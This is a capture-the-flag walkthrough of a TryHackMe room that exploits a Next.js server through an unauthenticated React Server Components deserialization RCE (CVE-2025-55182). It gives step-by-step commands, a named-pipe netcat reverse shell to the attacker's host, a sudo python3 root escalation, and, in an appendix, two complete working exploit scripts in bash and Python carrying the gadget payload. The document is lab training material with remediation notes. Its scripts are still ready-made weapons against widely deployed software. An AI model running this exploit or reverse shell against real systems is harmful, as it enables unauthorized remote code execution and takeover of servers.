# TryHackMe — CorpWebsite — Full Walkthrough


**Attack path in one line:** unauthenticated **CVE‑2025‑55182** (React Server Components unsafe deserialization → RCE) gives a shell as `daniel` inside a Docker container → `sudo NOPASSWD: /usr/bin/python3` gives container‑root.


## 1. Recon — port scan

```bash
# Full TCP scan. -Pn because the box does not answer ICMP.
nmap -Pn -n -p- --min-rate 1500 -T4 $TARGET
```

Result — only two ports:

```
22/tcp   open  ssh      OpenSSH 8.9p1 Ubuntu-3ubuntu0.13   (Ubuntu 22.04)
3000/tcp open  http     Next.js
```

No SSH creds yet → the way in is the web app on **3000**.

---

## 2. Enumeration — fingerprint the web app

```bash
curl -s -D - http://$TARGET:3000/ -o /dev/null
```

Key response headers:

```
X-Powered-By: Next.js
x-nextjs-cache: HIT
x-nextjs-stale-time: 300     <-- Next.js 15.x marker
```

The site ("Romance & Co.") is a single static landing page:

* Directory brute force (`ffuf` with a 63k wordlist) → **0 routes**.
* No `/api/*`, no login/admin, no client‑side `fetch()` endpoints.
* The contact form has no `name`/`action` attributes (not wired to anything).
* Image‑optimisation SSRF (`/_next/image?url=`) is locked to an allow‑list.

So this is **not** a hidden‑endpoint room. A modern Next.js app with *nothing* to click is a classic tell for a **framework‑level** vulnerability. Confirm with nuclei:

```bash
nuclei -u http://$TARGET:3000 -tags nextjs,tech
```

```
[CVE-2025-55182] [http] [critical]  http://10.48.160.13:3000
[tech-detect:next.js] [http] [info] http://10.48.160.13:3000
```

---

## 3. The vulnerability — CVE‑2025‑55182 (RSC RCE)

**What it is.** React Server Components (`react-server-dom-*`, React 19.0.0–19.2.0, bundled with vulnerable Next.js) deserialize the **React‑Flight** payload of a *Server Function* call straight from the HTTP request. The deserializer can be tricked into walking attacker‑controlled object/prototype paths (`__proto__`, `constructor:constructor`, …) and, via a `_prefix` field, into evaluating attacker‑supplied JavaScript on the server. That JS reaches Node's `child_process` → **unauthenticated RCE** (CVSS 10).

**How a request triggers it.**

1. `POST /` with header **`Next-Action: x`** — this makes Next.js route the request to the Server‑Action handler instead of rendering the page. (No valid action ID is needed; the bug fires during payload *parsing*, before validation.)
2. The body is `multipart/form-data` with three fields named `0`, `1`, `2` that reconstruct a crafted Flight model.
3. Field `0` carries the gadget chain. Its `_prefix` string is JavaScript that runs our command:

   ```js
   var res = process.mainModule
               .require('child_process')
               .execSync('<OUR COMMAND>')
               .toString().trim();
   // smuggle the output back out through a fake framework redirect:
   throw Object.assign(new Error('NEXT_REDIRECT'),
         { digest: `NEXT_REDIRECT;push;/login?a=${res};307;` });
   ```

4. Next.js turns that thrown `NEXT_REDIRECT` into a real HTTP redirect, so **the command output comes back in the `x-action-redirect` / `location` response header** as `/login?a=<output>`. That gives us a readable (semi‑blind) output channel without needing a callback.

**Output‑channel hygiene.** HTTP headers can't contain newlines, so we wrap the command as:

```
echo <base64-of-command> | base64 -d | sh 2>&1 | base64 -w0
```

* `base64` the command → no quoting problems inside the single‑quoted `execSync('…')`.
* pipe to `sh` because the container has **no bash**.
* `| base64 -w0` the *output* → a single, header‑safe line we decode locally.

---

## 4. Exploitation — get code execution


Two ready-made tools are saved in this folder, both verified against the box:

* **`exploit.sh`** — pure `bash` + `curl` + `base64`, no dependencies.
* **`rsc_rce.py`** — same logic in Python (`requests`), handy for scripting.

They build the malicious multipart request described in section 3: base64 the
command, embed it in the `_prefix` JS gadget, POST it with `Next-Action: x`,
then read the command output back out of the `x-action-redirect` header and
base64-decode it. Read either file to see the exact payload bytes.

Run a command:

```bash
./exploit.sh $TARGET:3000 'id'
# uid=100(daniel) gid=101(secgroup) groups=101(secgroup)

./exploit.sh $TARGET:3000 'whoami; hostname; id; uname -a'
# daniel / romance / Ubuntu 22.04 (aws kernel) -> we are inside a container
```

RCE confirmed as **daniel**. `/app` contains a `Dockerfile` + `docker-compose.yml`
and `/.dockerenv` exists, and there is no `bash` — we are in a minimal Docker
container.

Check which interpreters exist (needed for the reverse shell):

```bash
./exploit.sh $TARGET:3000 'command -v node nc python3 sh mkfifo'
# node, nc, python3, sh, mkfifo present ; bash absent
```

---

## 5. Reverse shell

Start your listener first:

```bash
nc -lvnp $LPORT        # on your attacker box (LPORT=4545)
```

The container has `nc` (no `-e`) and `mkfifo`, so use the classic named-pipe
reverse shell. We launch it **detached** (`nohup … &` in a subshell) so the
`execSync` call returns instead of hanging the HTTP request:

```bash
./exploit.sh $TARGET:3000 \
 "(nohup sh -c 'rm -f /tmp/.rs;mkfifo /tmp/.rs;cat /tmp/.rs|sh -i 2>&1|nc $LHOST $LPORT >/tmp/.rs' >/dev/null 2>&1 &); echo fired"
```

Your listener now has an interactive shell as `daniel`. Upgrade the TTY:

```bash
python3 -c 'import pty;pty.spawn("/bin/sh")'
```

### user flag

```bash
cat /home/daniel/user.txt
# THM{R34c7_2_5h311_3xpl017}
```

---

## 6. Privilege escalation — sudo / python3

Check sudo rights:

```bash
sudo -n -l
```

```
User daniel may run the following commands on romance:
    (root) NOPASSWD: /usr/bin/python3
```

`python3` runnable as root with no password is a textbook GTFOBins escalation —
Python can simply spawn a root shell:

```bash
sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
# id -> uid=0(root)
```

(You can do the whole thing without a shell too, straight through the RCE:)

```bash
./exploit.sh $TARGET:3000 \
  'sudo -n /usr/bin/python3 -c "import os;os.system(\"cat /root/root.txt\")"'
```

### root flag

```bash
cat /root/root.txt
# THM{Pr1v_35c_47_175_f1n357}
```

---

## 7. Notes & remediation

* **Root here is container-root.** The room's root flag lives in the
  container's `/root`, so the objective is met. A real engagement would next
  look at escaping to the Docker host (check capabilities, mounted sockets,
  kernel). On this box the container is unprivileged and the host is not
  required for the flag.
* **Cleanup:** the reverse-shell FIFO `/tmp/.rs` is left on the target —
  remove it when done.

### Fixes
1. **Patch CVE-2025-55182** — upgrade Next.js and `react-server-dom-*` to the
   fixed releases (React 19.2.1+ / the Next.js security advisory build). This is
   the root cause and is unauthenticated RCE — top priority.
2. **Remove the sudo rule** `daniel ALL=(root) NOPASSWD: /usr/bin/python3`.
   Interpreters should never be in a NOPASSWD sudoers entry.
3. Run the web app as a dedicated low-privilege user with **no sudo at all**,
   and keep it in a minimal, unprivileged container.

---

## Appendix — timeline of commands

```text
nmap -Pn -p- 10.48.160.13                      # recon: 22, 3000
curl -sD- http://10.48.160.13:3000/ -o /dev/null   # fingerprint: Next.js 15
nuclei -u http://10.48.160.13:3000 -tags nextjs    # -> CVE-2025-55182 critical
./exploit.sh 10.48.160.13:3000 'id'            # RCE as daniel
./exploit.sh ... '(nohup ... nc LHOST 4545 ...)'   # reverse shell
cat /home/daniel/user.txt                      # user flag
sudo -n -l                                     # (root) NOPASSWD: python3
sudo python3 -c 'import os;os.setuid(0);os.system("/bin/sh")'  # root
cat /root/root.txt                             # root flag
```

---

## Appendix B — full exploit scripts

Both scripts are the exact ones used above, verified against the box.

### exploit.sh — pure bash + curl + base64

```bash
#!/bin/bash
# CVE-2025-55182 - React Server Components RCE (Next.js) - manual curl exploit
# Usage: ./exploit.sh <target_host:port> '<shell command>'
# Output of the command is returned via the x-action-redirect response header.
set -euo pipefail

TARGET="${1:-10.48.160.13:3000}"
CMD="${2:-id}"
B="----WebKitFormBoundaryx8jO2oVc6SWP3Sad"

# 1) base64 our command so quoting/newlines never break the JS string,
#    run it with sh on the target, then base64 the OUTPUT so it is a single
#    header-safe line.
B64CMD=$(printf '%s' "$CMD" | base64 -w0)
INNER="echo ${B64CMD} | base64 -d | sh 2>&1 | base64 -w0"

# 2) JS gadget placed in _prefix: executes INNER, then throws a fake
#    NEXT_REDIRECT whose location carries the (base64) output in ?a=
JS="var res=process.mainModule.require('child_process').execSync('${INNER}').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: \`NEXT_REDIRECT;push;/login?a=\${res};307;\`});"

# 3) field "0" is the malicious React-Flight model. JS is embedded raw;
#    inner double-quotes in value are escaped as \" (there are none in JS here).
FIELD0='{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"'"${JS}"'","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}'

# 4) assemble the multipart body exactly (fields 0,1,2)
BODY=$(printf -- '--%s\r\nContent-Disposition: form-data; name="0"\r\n\r\n%s\r\n--%s\r\nContent-Disposition: form-data; name="1"\r\n\r\n"$@0"\r\n--%s\r\nContent-Disposition: form-data; name="2"\r\n\r\n[]\r\n--%s--\r\n' \
  "$B" "$FIELD0" "$B" "$B" "$B")

# 5) fire it. Next-Action header makes Next.js treat POST / as a Server Action.
RESP=$(curl -s -i -X POST "http://${TARGET}/" \
  -H "Next-Action: x" \
  -H "X-Nextjs-Request-Id: aaaabbbb" \
  -H "Content-Type: multipart/form-data; boundary=${B}" \
  --data-binary "$BODY")

# 6) pull command output out of the redirect header and base64-decode it
LINE=$(printf '%s' "$RESP" | grep -i -E 'x-action-redirect|^location' | head -1)
echo "$LINE" | grep -oE 'a=[^;]+' | sed 's/^a=//' | base64 -d 2>/dev/null || echo "[!] no output (check vuln / command)"
```

### rsc_rce.py — Python (requests) version

Run with `python3 rsc_rce.py 'id'`.

```python
#!/usr/bin/env python3
# CVE-2025-55182 - React Server Components unsafe-deserialization RCE
# Output is returned via the x-action-redirect / location response header (/login?a=<output>)
import sys, json, requests, urllib.parse

TARGET = "http://10.48.160.13:3000/"
BOUNDARY = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"

def run(cmd, timeout=20):
    # base64 the command so no quoting issues inside the JS single-quoted execSync arg
    import base64
    b64 = base64.b64encode(cmd.encode()).decode()
    # decode+run on target, then base64 the combined output so it is header-safe (single line)
    inner_cmd = "echo %s | base64 -d | sh 2>&1 | base64 -w0" % b64
    js = ("var res=process.mainModule.require('child_process')"
          ".execSync('%s').toString().trim();;"
          "throw Object.assign(new Error('NEXT_REDIRECT'),"
          "{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});" % inner_cmd)
    field0 = json.dumps({
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": "{\"then\":\"$B1337\"}",
        "_response": {
            "_prefix": js,
            "_chunks": "$Q2",
            "_formData": {"get": "$1:constructor:constructor"},
        },
    })
    body = (
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="0"\r\n\r\n{field0}\r\n'
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="1"\r\n\r\n"$@0"\r\n'
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="2"\r\n\r\n[]\r\n'
        f"--{BOUNDARY}--\r\n"
    )
    headers = {
        "Next-Action": "x",
        "X-Nextjs-Request-Id": "aaaabbbb",
        "X-Nextjs-Html-Request-Id": "ccccddddeeeeffff11112222",
        "Content-Type": f"multipart/form-data; boundary={BOUNDARY}",
    }
    r = requests.post(TARGET, data=body.encode(), headers=headers,
                      allow_redirects=False, timeout=timeout)
    loc = r.headers.get("x-action-redirect") or r.headers.get("location") or ""
    # extract after a=
    out = ""
    if "a=" in loc:
        out = loc.split("a=", 1)[1]
        # strip trailing ;307; style markers
        for term in [";", "&", "#"]:
            if term in out:
                out = out.split(term)[0]
        out = urllib.parse.unquote(out)
        import base64 as _b64
        try:
            out = _b64.b64decode(out).decode(errors="replace")
        except Exception:
            pass
    return r.status_code, loc, out

if __name__ == "__main__":
    cmd = sys.argv[1] if len(sys.argv) > 1 else "id"
    code, loc, out = run(cmd)
    print("[status]", code)
    print("[redirect header]", loc[:300])
    print("[output]")
    print(out)
```
